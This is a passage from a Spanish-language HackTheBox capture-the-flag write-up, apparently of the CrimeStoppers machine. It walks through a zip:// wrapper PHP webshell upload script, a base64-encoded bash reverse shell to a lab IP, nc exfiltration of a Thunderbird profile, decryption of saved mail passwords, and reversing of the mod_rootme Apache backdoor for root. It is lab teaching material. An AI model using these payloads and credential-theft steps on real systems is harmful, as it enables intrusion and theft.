‚Äúcomprimido‚Äù: ‚ù± file 080b0c55f8b278c18430a49a19cdd7410f160dc4 080b0c55f8b278c18430a49a19cdd7410f160dc4: Zip archive data, at least v1. 0 to extractOpa, pues s√≠, aprovechemos y validemos la integridad del archivo, as√≠ sabemos si contiene exactamente el contenido original, o sea, el contenido de acata. zip: ‚ù± md5sum *. zipfb8b9eeae8f174cf3e27457e44672411 080b0c55f8b278c18430a49a19cdd7410f160dc4. zipad1e77bf2c8214b174b083f9ea0b0c97 acata. zipPues no, son distintos :( ¬øy esto nos afecta? ¬øQu√© dices t√∫? ü§î pos claro, ya que seguramente el archivo este roto y no nos funcione la explotaci√≥n, podemos validarlo de dos formas, una es intentar descomprimir el objeto 08. . . . zip: ‚ù± unzip 080b0c55f8b278c18430a49a19cdd7410f160dc4. zip Archive: 080b0c55f8b278c18430a49a19cdd7410f160dc4. zipwarning [080b0c55f8b278c18430a49a19cdd7410f160dc4. zip]: 10 extra bytes at beginning or within zipfile (attempting to process anyway)error [080b0c55f8b278c18430a49a19cdd7410f160dc4. zip]: start of central directory not found; zipfile corrupt.  (please check that you have transferred or created the zipfile in the appropriate BINARY mode and that you have compiled UnZip properly)Vemos que no es v√°lido :( O probar de igual forma la explotaci√≥n, intentemos primero localizar el objeto 080b0c55f8b278c18430a49a19cdd7410f160dc4 con el wrapper: http://10. 10. 10. 80/?op=zip://uploads/10. 10. 14. 6/080b0c55f8b278c18430a49a19cdd7410f160dc4http://10. 10. 10. 80/?op=zip://uploads/10. 10. 14. 6/080b0c55f8b278c18430a49a19cdd7410f160dc4%23hola. phpPero recuerda que el par√°metro op incluye la extensi√≥n . php por si solo, as√≠ que debemos probar as√≠: http://10. 10. 10. 80/?op=zip://uploads/10. 10. 14. 6/080b0c55f8b278c18430a49a19cdd7410f160dc4%23holaPas√°ndole el par√°metro que recibe el archivo hola. php: http://10. 10. 10. 80/?op=zip://uploads/10. 10. 14. 6/080b0c55f8b278c18430a49a19cdd7410f160dc4%23hola&amp;xmd=idPero nada, todos nos responden: üòî As√≠ que F, hay algo en el env√≠o que corrompe nuestro archivo y no permite que se suba correctamente (t√©cnicamente hablando: jodi√©ndonos la integridad del mismo). 4. Logramos la subida correctamente y jugamos con el wrapper zip://. Despu√©s de mover, quitar, lavarme la cara a ver si es que estaba dormido y no vi algo, etc. Despu√©s de un tiempo se me ocurri√≥ hacer exactamente lo mismo que con Burp, enviar el contenido del . zip en una cadena en base64 peeeeero desde un script en Python, que el mismo se encargue de jugar con los bytes y dem√°s temitas. Entonces la idea es que el script tome la cadena en base64, la decode a bytes y haga el envi√≥ sobre el campo de texto tip (si nos fijamos en la petici√≥n que hicimos con Burp no estamos subiendo un archivo como tal (no existe filename o Content-Type en el campo tip), estamos pasando un texto que al estar dentro de un archivo dar√° formato a un objeto . zip). üôå Con esta prueba logramos que la data del archivo viaje sin problemas y que una vez validamos la integridad los dos archivos sean iguales :) Este es el fragmento del script que hace la subida: . . . session = requests. Session()# - Extraemos token de sesion para poder subir un archivor = session. get(URL, params={ op : upload })soup = BeautifulSoup(r. content,  html. parser )token_value = soup. find(attrs={ name :  token })[ value ]# - Subimos contenido del archivo . zipzip_file_b64 =  UEsDBAoAAAAAAMxRA1N1AJ8mHwAAAB8AAAAIABwAaG9sYS5waHBVVAkAA09dCWFPXQlhdXgLAAEE6AMAAAToAwAAPD9waHAgc3lzdGVtKCRfR0VUWyd4bWQnXSk7ID8+ClBLAQIeAwoAAAAAAMxRA1N1AJ8mHwAAAB8AAAAIABgAAAAAAAEAAACkgQAAAABob2xhLnBocFVUBQADT10JYXV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAABhAAAAAAA= # Pasamos de base64 a byteszip_file_bytes = zip_file_b64. encode('utf-8')zip_file = base64. decodebytes(zip_file_bytes)data_post = {   tip : zip_file,   name :  hola ,   token : token_value,   submit :  Send Tip! }r = session. post(URL, params={ op : upload }, data=data_post)# Extraemos el nombre del archivo generado (el hash)secretname = r. url. split('=')[2]print(secretname). . . Por si no me crees sobre que va en la cadena base64 e. e Si lo ejecutamos tendr√≠amos este nombre de archivo: ‚ù± python3 rceZIPwrapper. py 7aaa6229865be1a673429fe1df2d9317bea8e863Validamos integridad: ‚ù± curl http://10. 10. 10. 80/uploads/10. 10. 14. 6/7aaa6229865be1a673429fe1df2d9317bea8e863 -o 7aaa6229865be1a673429fe1df2d9317bea8e863‚ù± file 7aaa6229865be1a673429fe1df2d9317bea8e863 7aaa6229865be1a673429fe1df2d9317bea8e863: Zip archive data, at least v1. 0 to extract‚ù± mv 7aaa6229865be1a673429fe1df2d9317bea8e863 7aaa6229865be1a673429fe1df2d9317bea8e863. zip‚ù± md5sum *. zipad1e77bf2c8214b174b083f9ea0b0c97 7aaa6229865be1a673429fe1df2d9317bea8e863. zipad1e77bf2c8214b174b083f9ea0b0c97 acata. zipPerfectisimooooo, son iguales, as√≠ que su contenido tambi√©n es igual, por lo queeeeeeeeeeeeeee: http://10. 10. 10. 80/?op=zip://uploads/10. 10. 14. 6/7aaa6229865be1a673429fe1df2d9317bea8e863 Peeeeeero si referenciamos alg√∫n archivo que tenga dentrooooo: http://10. 10. 10. 80/?op=zip://uploads/10. 10. 14. 6/7aaa6229865be1a673429fe1df2d9317bea8e863%23hola Desaparece el errooooooooooooooooooooooooooor‚Ä¶ YYYYYYYYYYYYY si le pasamos el par√°metro xmd con alg√∫n comando, ejemplo id: TAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOS, conseguimos RCEEEEEEEEEEE, dios, como cost√≥ (: pero que guapachoso. Bien, ya tenemos ejecuci√≥n remota de comandos, d√©mosle un mejor formato a nuestro script para desde el subir el contenido . zip y tambi√©n ejecutar comandos‚Ä¶  rceZIPwrapper. py ‚Ä¶ Generemos una reverse Shell, pong√°monos en escucha por el puerto 4433: ‚ù± nc -lvp 4433Ahora (una de las maneras), generaremos un texto que tenga exactamente nuestra reverse shell: ‚ù± printf '#!/bin/bash \nbash -i &gt;&amp; /dev/tcp/10. 10. 14. 6/4433 0&gt;&amp;1'#!/bin/bash bash -i &gt;&amp; /dev/tcp/10. 10. 14. 6/4433 0&gt;&amp;1Ahora lo encodeamos a base64: ‚ù± printf '#!/bin/bash \nbash -i &gt;&amp; /dev/tcp/10. 10. 14. 6/4433 0&gt;&amp;1' | base64IyEvYmluL2Jhc2ggCmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMzIDA+JjE=Tomamos esa cadena y como comando hacia la m√°quina le indicamos:  Decodea la cadena que te estoy pasando en base64.  Y el resultado quiero que me lo interpretes con una bash. O sea, ejec√∫tame lo que sea que venga‚Ä¶‚ù± python3 rceZIPwrapper. py -i 10. 10. 14. 6 -c 'echo IyEvYmluL2Jhc2ggCgpiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYvNDQzMyAwPiYx | base64 -d | bash' Listooooones, tamos dentro, hacemos tratamiento de la TTY para tener una shell bonita, que no nos de problemas si es que queremos ejecutar CTRL+C, nos permita tener hist√≥rico y que podamos movernos entre comandos‚Ä¶ Sigamos üö£ ‚Ä¶ Movimiento lateral : Thunderbird #Listando que usuario existen el sistema nos encontramos con dom, si vamos a su /home entonces este √°rbol de directorios: www-data@ubuntu:/home/dom$ ls -latotal 44drwxr-xr-x 5 dom dom 4096 Dec 25 2017 . drwxr-xr-x 3 root root 4096 Dec 16 2017 . . -rw------- 1 dom dom  52 Dec 16 2017 . Xauthority-rw------- 1 dom dom   5 Dec 22 2017 . bash_history-rw-r--r-- 1 dom dom  220 Dec 16 2017 . bash_logout-rw-r--r-- 1 dom dom 3771 Dec 16 2017 . bashrcdrwx------ 2 dom dom 4096 Dec 16 2017 . cache-rw-r--r-- 1 dom dom  675 Dec 16 2017 . profiledrwx------ 2 dom dom 4096 Dec 16 2017 . ssh-rw-r--r-- 1 dom dom   0 Dec 16 2017 . sudo_as_admin_successfuldrw-r-xr-x 3 root root 4096 Dec 16 2017 . thunderbird-r--r--r-- 1 root root  33 Aug 2 13:20 user. txtHay un directorio oculto algo llamativo y que no hab√≠a visto antes en otras m√°quinas: . thunderbird, veamos que hay en su contenido: www-data@ubuntu:/home/dom/. thunderbird$ ls -latotal 12drw-r-xr-x 3 root root 4096 Dec 16 2017 . drwxr-xr-x 5 dom dom 4096 Dec 25 2017 . . drw-r-xr-x 9 root root 4096 Dec 16 2017 36jinndk. defaultwww-data@ubuntu:/home/dom/. thunderbird$ cd 36jinndk. default/www-data@ubuntu:/home/dom/. thunderbird/36jinndk. default$ ls -a .               blist. sqlite      cookies. sqlite   formhistory. sqlite     minidumps      saved-telemetry-pings  webappsstore. sqlite-shm. .               blocklist-addons. json  cookies. sqlite-shm global-messages-db. sqlite panacea. dat     search. json. mozlz4    webappsstore. sqlite-wal. parentlock          blocklist-gfx. json   cookies. sqlite-wal gmp            permissions. sqlite secmod. db        xulstore. jsonImapMail           blocklist-plugins. json crashes       history. mab        places. sqlite    session. jsonMail             blocklist. xml      datareporting    key3. db          places. sqlite-shm  sessionCheckpoints. jsonSiteSecurityServiceState. txt cert8. db        directoryTree. json kinto. sqlite        places. sqlite-wal  storage. sqliteabook. mab           compatibility. ini    extensions. ini   logins. json        prefs. js      times. jsonaddons. json          content-prefs. sqlite  extensions. json   mailViews. dat       revocations. txt   webappsstore. sqliteUfff, varios archivos, algunos con nombres llamativos como key3. db, logins. json, session. json o storage. sqlite. Si buscamos en todos los objetos la cadena username encontramos algo interesante a la vista: Hay unas credenciales encriptadas y referencias hacia el usuario dom üòÆ puede ser un rabbit hole como pueda que no, exploremos:  Thunderbird hace referencia a Mozilla Thunderbird, un gestor de correo electr√≥nico, de noticias y de chats. M√°s info: ‚Äú¬øQu√© es Thunderbird?‚Äù. Buscando info relacionada con decrypt password thunderbird en internet llegamos a este foro donde podemos destacar cositas:  Las contrase√±as en Mozilla son guardadas (o bueno en 2014) en dos archivos:     signons. sqlite.    keys3. db.    Estos objetos deber√≠an estar en una ruta con este formato: ~/. thunderbird/*. default. Si nos fijamos concuerda con lo nuestro, ya que tenemos /home/dom/. thunderbird/36jinndk. default, as√≠ que podemos pensar que 36jinndk es un perfil que se le gener√≥ al usuario dom.  On linux, the password database is stored in: /home/$USER/. thunderbird/$RANDOM_STRING. default/signons. sqlite. Bien, si nos fijamos en nuestros objetos el archivo signons. sqlite no existe, es ah√≠ cuando llegamos a este nuevo hilo que nos habla sobre el archivo key3. db y su funci√≥n que es almacenar la llave necesaria para desencriptar las passwords guardadas por Mozilla. En el hilo una de las respuestas nos indica que el nombre de logins. json antes era signons. sqlite, as√≠ que tamos perfectos y cero preocupados en tener que encontrar otro archivo. Leyendo nos damos cuenta de que Thunderbird genera una ‚ÄúMaster Password‚Äù vac√≠a o la que indique el usuario, esta master password ser√≠a la que proteger√≠a a tooooodas las contrase√±as que se vayan guardando. Por lo que si no contamos con una master password (y es necesaria) tendremos que buscar maneras de encontrarla üò® Profundizando un poco m√°s llegamos a este nuevo hilo donde referencian dos herramientas que se encargan de desencriptar las contrase√±as:  firepwd.  firefox_decrypt.  Pa leer: Reveal saved Mozilla Firefox passwords. As√≠ que juguemos con las dos, vamos a sus repos y nos las clonamos, empecemos con firepwd: Dumpeamos credenciales de Thunderbird üìå: üéà firepwd. py: ‚ù± python3 firepwd. py cannot find key4. db or key3. dbDirectamente nos pide el archivo key3. db, as√≠ que pas√©moslo a nuestra m√°quina y volvamos a ejecutar: ‚ù± python3 firepwd. py SEQUENCE {  SEQUENCE {  . . . . . . missing logins. json or signons. sqlite. . . Nos sale error, hace falta el archivo logins. json, as√≠ que tambi√©n lo pasamos a nuestra m√°quina y volvemos a ejecutar: ‚ù± python3 firepwd. py SEQUENCE {  SEQUENCE {  . . . . . . Perrrrrfecto, nos devuelve una contrase√±a del servicio imap y smtp, podemos probar a hacer reutilizaci√≥n de contrase√±as a ver si son funcionales en el sistema como el usuario dom: Listooooooooooooones, somos dom (: antes de seguir veamos r√°pidamente como hubiera sido con firefox_decrypt. py: üéà firefox_decrypt. py: Este script nos pide la ruta donde est√°n tooooooodos los archivos del perfil, o sea: 36jinndk. default, pues hagamos la sencilla, comprimamos todo el directorio y nos lo pasamos a nuestro sistema para posteriormente ejecutar el programa haciendo referencia a ese directorio: www-data@ubuntu:/tmp$ tar -zcvf thunderthunder. tar. gz /home/dom/. thunderbird/36jinndk. default//home/dom/. thunderbird/36jinndk. default//home/dom/. thunderbird/36jinndk. default/webappsstore. sqlite. . . /home/dom/. thunderbird/36jinndk. default/crashes/store. json. mozlz4www-data@ubuntu:/tmp$ lsthunderthunder. tar. gzAhora en nuestra m√°quina nos ponemos en escucha sobre un puerto y le indicamos que todo lo que llegue por ese puerto lo guarde en un archivo llamado thunderthunder. tar. gz: ‚ù± nc -lvp 4434 &gt; thunderthunder. tar. gzY en la m√°quina v√≠ctima le decimos que env√≠e el contenido de thunderthunder. tar. gz esperando 10 segundos para que se copie tooooodo todito: www-data@ubuntu:/tmp$ nc -w 10 10. 10. 14. 6 4434 &lt; thunderthunder. tar. gzRecibimos la petici√≥n en nuestro listener, esperamos y ahora validamos la integridad del archivo: www-data@ubuntu:/tmp$ md5sum thunderthunder. tar. gz f6e7ceae0c34fc66890c6072a3cddee5 thunderthunder. tar. gz‚ù± md5sum thunderthunder. tar. gz f6e7ceae0c34fc66890c6072a3cddee5 thunderthunder. tar. gzLo descomprimimos, (se genera una carpeta home, ah√≠ esta el perfil de Mozilla, no te asustes) y ejecutamos el script: ‚ù± tar xvf thunderthunder. tar. gz ‚ù± mv home/dom/. thunderbird/36jinndk. default/ . ‚ù± chmod 755 36jinndk. default/‚ù± python3 firefox_decrypt. py 36jinndk. default/ Bien, conseguimos la contrase√±a, as√≠ que con cualquiera de las dos herramientas lo hubi√©ramos logrado (: ‚Ä¶ Escalada de privilegios #Despu√©s de una ardua enumeraci√≥n volvemos al directorio . thunderbird y nos escondemos dentro de otro directorio, en este caso de ImapMail: dom@ubuntu:~/. thunderbird/36jinndk. default$ cd ImapMail/dom@ubuntu:~/. thunderbird/36jinndk. default/ImapMail$ lscrimestoppers. htb crimestoppers. htb. msfdom@ubuntu:~/. thunderbird/36jinndk. default/ImapMail$ cd crimestoppers. htb/Dentro de crimestoppers. htb/ hay varios archivos: dom@ubuntu:~/. thunderbird/36jinndk. default/ImapMail/crimestoppers. htb$ ls -latotal 72drw-r-xr-x 2 root root 4096 Dec 16 2017 . drw-r-xr-x 3 root root 4096 Dec 16 2017 . . -rw-r-xr-x 1 root root 1268 Dec 16 2017 Archives. msf-rw-r-xr-x 1 root root 2716 Dec 16 2017 Drafts-1-rw-r-xr-x 1 root root 2599 Dec 16 2017 Drafts-1. msf-rw-r-xr-x 1 root root 1265 Dec 16 2017 Drafts. msf-rw-r-xr-x 1 root root 1024 Dec 16 2017 INBOX-rw-r-xr-x 1 root root 4464 Dec 16 2017 INBOX. msf-rw-r-xr-x 1 root root 1268 Dec 16 2017 Junk. msf-rw-r-xr-x 1 root root  25 Dec 16 2017 msgFilterRules. dat-rw-r-xr-x 1 root root 7767 Dec 16 2017 Sent-1-rw-r-xr-x 1 root root 4698 Dec 16 2017 Sent-1. msf-rw-r-xr-x 1 root root 1263 Dec 16 2017 Sent. msf-rw-r-xr-x 1 root root 1271 Dec 16 2017 Templates. msf-rw-r-xr-x 1 root root 1620 Dec 16 2017 Trash. msfEstos hacen referencia a los distintos buzones del correo de dom, al recorrer algunos encontramos cositas interesantes: dom@ubuntu:~/. thunderbird/36jinndk. default/ImapMail/crimestoppers. htb$ cat INBOXFrom - Sat Dec 16 11:47:00 2017X-Mozilla-Status: 0001X-Mozilla-Status2: 00000000Return-Path: WhiteRose@DarkArmy. htbReceived: from [172. 16. 10. 153] (ubuntu [172. 16. 10. 153])    by DESKTOP-2EA0N1O with ESMTPA    ; Sat, 16 Dec 2017 14:46:57 -0500To: dom@CrimeStoppers. htbFrom: WhiteRose &lt;WhiteRose@DarkArmy. htb&gt;Subject: RCE VulnerabilityMessage-ID: &lt;9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy. htb&gt;Date: Sat, 16 Dec 2017 11:46:54 -0800User-Agent: Mozilla/5. 0 (X11; Linux x86_64; rv:52. 0) Gecko/20100101 Thunderbird/52. 5. 0MIME-Version: 1. 0Content-Type: text/plain; charset=utf-8; format=flowedContent-Transfer-Encoding: 8bitContent-Language: en-USHello,I left note on  Leave a tip  page but no response. ¬† Major vulnerability exists in your site!¬† This gives code execution. Continue to investigate us, we will sell exploit!¬† Perhaps buyer will not be so kind. For more details place 1 million ecoins in your wallet. ¬† Payment instructions will be sent once we see you move money. Un correo de darkarmy, ya nos hab√≠amos encontrado con ellos al inicio de la m√°quina, ac√° hacen referencia a la misma explotaci√≥n del wrapper que nos permiti√≥ conseguir RCE. Si seguimos mirando hay m√°s correos: Los correos que dom envi√≥: dom@ubuntu:~/. thunderbird/36jinndk. default/ImapMail/crimestoppers. htb$ cat Sent-1La respuesta a darkarmy: FromSubject: Re: RCE VulnerabilityTo: WhiteRose &lt;WhiteRose@DarkArmy. htb&gt;References: &lt;9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy. htb&gt;From: dom &lt;dom@crimestoppers. htb&gt;               Message-ID: &lt;18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers. htb&gt;  Date: Sat, 16 Dec 2017 11:49:27 -0800User-Agent: Mozilla/5. 0 (X11; Linux x86_64; rv:52. 0) Gecko/20100101 Thunderbird/52. 5. 0MIME-Version: 1. 0In-Reply-To: &lt;9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy. htb&gt;Content-Type: text/plain; charset=utf-8; format=flowedContent-Transfer-Encoding: 8bitContent-Language: en-USIf we created a bug bounty page, would you be open to using them as amiddle man?¬† Submit the bug, they will verify the existence and handlethe payment. I don't know how this ecoins things work. On 12/16/2017 11:46 AM, WhiteRose wrote:&gt; Hello,&gt;&gt; I left note on  Leave a tip  page but no response. ¬† Major&gt; vulnerability exists in your site!¬† This gives code execution. &gt; Continue to investigate us, we will sell exploit!¬† Perhaps buyer will &gt; not be so kind. &gt;&gt; For more details place 1 million ecoins in your wallet. ¬† Payment&gt; instructions will be sent once we see you move money. &gt;. . . Le adjunta a santiago lo hablado con la darkarmy: . . . From                                                                                              Subject: Fwd: Re: RCE Vulnerability                                                                               References: &lt;18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers. htb&gt;To: santiago@crimestoppres. htbFrom: dom &lt;dom@crimestoppers. htb&gt;X-Forwarded-Message-Id: &lt;18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers. htb&gt;Message-ID: &lt;24afa630-bf3c-5361-9c20-969bf934bd14@crimestoppers. htb&gt;Date: Sat, 16 Dec 2017 11:55:50 -0800User-Agent: Mozilla/5. 0 (X11; Linux x86_64; rv:52. 0) Gecko/20100101 Thunderbird/52. 5. 0MIME-Version: 1. 0In-Reply-To: &lt;18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers. htb&gt;Content-Type: multipart/alternative; boundary= ------------6B48F005D20D18C4F951CD41  Content-Language: en-USThis is a multi-part message in MIME format. --------------6B48F005D20D18C4F951CD41Content-Type: text/plain; charset=utf-8; format=flowedContent-Transfer-Encoding: 8bitDid you know anything about this?¬† Anyways, I'm trying to get them to agree to an alternative form of payment where we can better track the recipient. Hope the DarkArmy thinks we're a bunch of dummies that don't know anything about eCoin. . . . Y un correo hacia elliot: From To: elliot@ecorp. htbFrom: dom &lt;dom@crimestoppers. htb&gt;Subject: Potential RootkitMessage-ID: &lt;54814ded-5024-79db-3386-045cd5d205b2@crimestoppers. htb&gt;Date: Sat, 16 Dec 2017 12:55:24 -0800 User-Agent: Mozilla/5. 0 (X11; Linux x86_64; rv:52. 0) Gecko/20100101 Thunderbird/52. 5. 0MIME-Version: 1. 0Content-Type: text/plain; charset=utf-8; format=flowedContent-Transfer-Encoding: 8bitContent-Language: en-USElliot. We got a suspicious email from the DarkArmy claiming there is a Remote Code Execution bug on our Webserver. ¬† I don't trust them and ran rkhunter, it reported that there a rootkit installed called: apache_modrootme backdoor. According to my research, if this rootkit was on the server I should be able to run  nc localhost 80  and then type  get root  to get a root shell. ¬†¬† However, the server just errors out without providing any shell at all. ¬† Would you mind checking if this is a false positive?üôÄ ufff, en este √∫ltimo nos hablan de un rootkit que fue descubierto con ayuda de la herramienta rkhunter. El rootkit se hace llamar apache_modrootme. Nos indica que seg√∫n su b√∫squeda si el rootkit existiera en el sistema, deber√≠a ejecutar nc localhost 80 y despu√©s escribir get root para obtener una Shell como el usuario root, pero que una vez ingresa el get root no pasa nada y solo ve errores‚Ä¶ Opa, pues interesante, si nos vamos a la web r√°pidamente encontramos el repositorio del rootkit:  https://github. com/sajith/mod-rootme. Pero antes de abordar esto, conozcamos que es un rootkit: üí£ Un rootkit es un software que permite tener acceso total a un sistema, las mejor llamadas ‚Äúpuertas traseras‚Äù, las cuales nos generan persistencia en una m√°quina, se caracterizan por pasar desapercibidas en toooooodo el sistema e incluso dif√≠ciles de encontrar por analizadores de rootkits. M√°s info: avast. Bien, sigamos‚Ä¶ Encontramos rootkit en el sistema üìå: Seg√∫n la descripci√≥n del rootkit vemos su uso: Tenemos dos referencias a archivos, busqu√©moslos en el sistema: dom@ubuntu:~$ ls -la /etc/apache2/mods-available/rootme. load /usr/lib/apache2/modules/mod_rootme. so-rw-r--r-- 1 root root  64 Dec 16 2017 /etc/apache2/mods-available/rootme. load-rw-r----- 1 root dom 48584 Dec 22 2017 /usr/lib/apache2/modules/mod_rootme. sodom@ubuntu:~$ file /etc/apache2/mods-available/rootme. load /usr/lib/apache2/modules/mod_rootme. so/etc/apache2/mods-available/rootme. load: ASCII text/usr/lib/apache2/modules/mod_rootme. so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=792d97353c062bb316fbb45f6109ade9a87591c7, not strippedBien, una descripci√≥n y el binario del rootkit. Intentemos hacerlo funcionar as√≠ como nos indicaba el correo (y el repo): dom@ubuntu:~$ nc localhost 80get root&lt;!DOCTYPE HTML PUBLIC  -//IETF//DTD HTML 2. 0//EN &gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Bad Request&lt;/h1&gt;&lt;p&gt;Your browser sent a request that this server could not understand. &lt;br /&gt;&lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2. 4. 25 (Ubuntu) Server at 127. 0. 1. 1 Port 80&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;Pero sip, obtenemos errores‚Ä¶ üéø Sabemos que existe un rootkit en el sistema, pero si intentamos usarlo como en el repo (o en el correo) no nos funciona, pues mov√°moslo hacia nuestra m√°quina y hagamos un an√°lisis est√°tico del binario, pueda que los atacantes lo hayan modificado para que el uso sea exclusivamente de ellos: ‚ù± nc -lvp 4433 &gt; mod_rootmedom@ubuntu:~$ nc -w 20 10. 10. 14. 6 4433 &lt; /usr/lib/apache2/modules/mod_rootme. soListones. Hacemos reversing hacia el rootkit üìå: Jugaremos con radare2.  Radare2: abriendo las puertas al reversing.  Brutal post para adentrarte en el mundo del reversing y entender algunas instrucciones.  Guia super completa para el uso de radare2. Lo cargamos, analizamos las funciones (aaa) del binario y las imprimimos (afl): ‚ù± r2 mod_rootme [0x00000f70]&gt; aaa. . . [0x00000f70]&gt; afl Bien, todas con nombres llamativos, pero existe una que se relaciona con nuestra m√°quina, ¬øcu√°l es? Exacto, sym. darkarmy, pues pasemos el lenguaje m√°quina a lenguaje ensamblador e intentemos (jaaaaaa üòÇ) entender que esta pasando en esa funci√≥n, usamos pdf @ que seria print disassemble function @ nombre_de_la_funcion: [0x00000f70]&gt; pdf @ sym. darkarmy üñ§ Esto es lo que me gusta de radare2, lindos colores y f√°cil de ver los flujos :P Bien, de primeras nos fijamos en el comentario ‚ÄúHackTheBox‚Äù, pero que realmente es una cadena (str) que su direcci√≥n en memoria esta siendo guardada en el registro rsi. Arriba de esta instrucci√≥n vemos el mismo proceso solo que ahora en lugar de una str toma una direcci√≥n de memoria y la guarda en el registro rdi.  lea (Load Effective Address). Si nos fijamos hay un loop el cual da 10 iteraciones: Listos, algo llamativo es que hace un xor por cada byte, compara la string HackTheBox con el valor que tenga la direcci√≥n 0x00001bf2, por lo que podemos pensar que HackTheBox es la llave necesaria para jugar con el xor: Pues veamos el contenido de esa direcci√≥n: [0x00000f70]&gt; pxw @ 0x00001bf2 Ahora, si recordamos el bucle hace 10 iteraciones, por lo que de ese output de arriba debemos tomar los 10 caracteres: [0x00000f70]&gt; x/10x 0x00001bf2- offset -  0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF0x00001bf2 0e14 0d38 3b0b 0c27 1b01Bien, ya tenemos nuestra posible key y los valores con los que esta haciendo el xor, pues hagamos un script r√°pido en Python que nos devuelva el resultado de esa operaci√≥n:  Hay un ejemplo gr√°fico bien lindo ac√° para entender XOR - XOR Python Byte Strings.  Nos basaremos en este ejemplo para nuestro script. #!/usr/bin/python3'''0e14 0d38 3b0b 0c27 1b01'''key =  HackTheBox xor_value = '\x0e\x14\x0d\x38\x3b\x0b\x0c\x27\x1b\x01'text =   for i in range(len(xor_value)):  '''  xor_hex = Tomamos cada valor hexadecimal  key_value = len(key) = 10  |  0/10 . . 1/10 . . 2/10 . .  |  Extraemos cada valor de la key   xor_result = Pasamos cada valor ascii a su valor decimal y hacemos la comparativa XOR.   '''  xor_hex = xor_value[i]  key_value = key[i%(len(key))]  xor_result = ord(key_value) ^ ord(xor_hex)  # Y ahora tomamos cada valor decimal y lo pasamos a su valor ascii, as√≠ juntamos toda la cadena.   text += chr(xor_result)print(text)'''  # As√≠ podemos ver como se genera el XOR:  print(bin(ord(key_value))[2:]. zfill(8))  print(bin(ord(xor_hex))[2:]. zfill(8))  print( ---------- )  print(bin(xor_result)[2:]. zfill(8))  print()'''Perfecto, si ejecutamos el script, vemos: Opa, interesante, si lo concatenamos con nuestra enumeraci√≥n (que no puse antes para no enredar) del binario vemos la funci√≥n sym. rootme_post_read_request que es la que valida lo que le pasemos cuando ejecutamos nc localhost 80: Ah√≠ vemos que toma un argumento, as√≠ que podemos probar esa cadena devuelta por el programa ahora sobre el rootkit: PERFECTOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo, tenemos el rootkit en funcionamiento, por lo tanto tenemos una Shell como el usuario root (: ‚Ä¶ Post-Explotaci√≥n: Accedemos por SSH usando IPv6 #IppSec nos deja una nota: root@ubuntu:/root# cat Congratulations. txt Hope you enjoyed the machine! The root password is crackable, but I would be surprised if anyone managed to crack it without watching the show.  But who knows it is DESCrypted after all so BruteForce is possible. Oh and kudo's if you just SSH'd in via IPv6 once you got dom's pw :)-IppsecEl tema del crackeo lo intent√©, pero nadita, tambi√©n nos dice que podemos establecer una SSH por medio de un direccionamiento IPv6, pues intent√©moslo:  How to ssh to IPv6 address on Linux. root@ubuntu:/root# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000  link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00  inet 127. 0. 0. 1/8 scope host lo    valid_lft forever preferred_lft forever  inet6 ::1/128 scope host    valid_lft forever preferred_lft forever2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000  link/ether 00:50:56:b9:6c:2b brd ff:ff:ff:ff:ff:ff  inet 10. 10. 10. 80/24 brd 10. 10. 10. 255 scope global ens33    valid_lft forever preferred_lft forever  inet6 dead:beef::250:56ff:feb9:6c2b/64 scope global mngtmpaddr dynamic    valid_lft 86286sec preferred_lft 14286sec  inet6 fe80::250:56ff:feb9:6c2b/64 scope link    valid_lft forever preferred_lft foreverNuestra interfaz es la ens33, tomamos su direcci√≥n IPv6: inet6 dead:beef::250:56ff:feb9:6c2bY ahora desde nuestra m√°quina nos conectamos a esa direcci√≥n con el usuario dom (que tenemos credenciales): ‚ù± ssh dom@dead:beef::250:56ff:feb9:6c2b Peeeererererfecto, ahora s√≠, veamos las flags: ‚Ä¶ Una parte final muuuuuy dolorosa mentalmente hablando üòÜ Linda experiencia, muy loca y sobre todo muy bien encaminada. Me encanto la parte de criptograf√≠a, a ser verdad esta fue en mucho tiempo mi reencuentro con ella as√≠ que no fue muy. . ¬øllevadero? jajaj, pero igual refrescamos ideas y sobre todo aprendimos un mont√≥n. ¬°BRUTAL! Y weno, nos vamos, nos vemos y nos vimos! A seguir rompiendo todooooooooooOo0! "
    }, {
    "id": 29,
    "url": "http://localhost:4000/htb/love",
    "title": "HackTheBox - Love",
    "body": "2021/08/07 - M√°quina Windows nivel f√°cil, escanearemos archivos locales (localhost) en busca de malware e. e Encontraremos credenciales y generaremos votantes con fotos de perfil peligrosas‚Ä¶ Jugaremos con registros e instalaremos paquetes MSI algo traviesos.  TL;DR (Spanish writeup): Creada por: pwnmeow. Caminos para caminantes con caminos caminantes e. e Nos enfrentaremos a un servicio web con dos logins, uno de ellos nos permite jugar con usuarios y contrase√±as, enumerando un dominio distinto al default, llegamos a una web que escanea archivos en b√∫squeda de malware, el archivo se lo debemos pasar por medio de una URL, jugaremos con esto para ver recursos locales (http://localhost) a los que externamente no tenemos acceso, en esa labor lograremos enumerar un servicio web alojado en el puerto 5000 (http://localhost:5000), de √©l encontraremos unas credenciales para un usuario llamado admin, las usaremos contra uno de los login y entraremos a una plataforma que administra un sistema de votaciones‚Ä¶ Estando dentro podremos agregar votantes, a cada votante se le puede adjuntar una imagen de perfil, 